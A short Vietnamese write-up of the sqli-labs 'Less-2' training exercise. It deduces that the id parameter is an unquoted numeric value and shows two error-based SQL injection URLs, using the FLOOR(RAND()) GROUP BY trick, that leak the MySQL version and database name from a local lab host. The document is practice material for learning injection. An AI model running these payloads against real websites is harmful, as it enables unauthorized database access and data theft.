# Less 2

Ta thấy ở bài này là lỗi error based

![](../images/sqli-labs/Less-2/l21.png)

Đề bài yêu cầu truyền vào giá trị là số

![](../images/sqli-labs/Less-2/l22.png)

Nhập thử một số giá trị

![](../images/sqli-labs/Less-2/l23.png)

Dự đoán câu query sẽ là:

```
select name, passwd from table where id='$ID'
```

Tiếp tục truyền vào một số giá trị

![](../images/sqli-labs/Less-2/l24.png)

![](../images/sqli-labs/Less-2/l25.png)

Chứng tỏ `$ID` không nằm trong dấu nháy. Câu query có thể là:

```
select name, passwd from table where id=$ID
```

![](../images/sqli-labs/Less-2/l26.png)

Câu query lúc này có thể là:

```
select name, passwd from table where id=$ID limit 0,1
```

Ta có thể xem được một số thông tin của DB

```
http://192.168.84.233/sqli-labs/Less-2/?id=1 and (SELECT 0 FROM (SELECT count(*), CONCAT((select @@version), 0x23, FLOOR(RAND(0)*2)) AS x FROM information_schema.columns GROUP BY x) y) --+
```

![](../images/sqli-labs/Less-2/01.png)

```
http://192.168.84.233/sqli-labs/Less-2/?id=1 and (SELECT 0 FROM (SELECT count(*), CONCAT((select database()), 0x23, FLOOR(RAND(0)*2)) AS x FROM information_schema.columns GROUP BY x) y) --+
```

![](../images/sqli-labs/Less-2/02.png)

Thao tác được giống với ở [Less-1](sqli-labs/Less-1.md)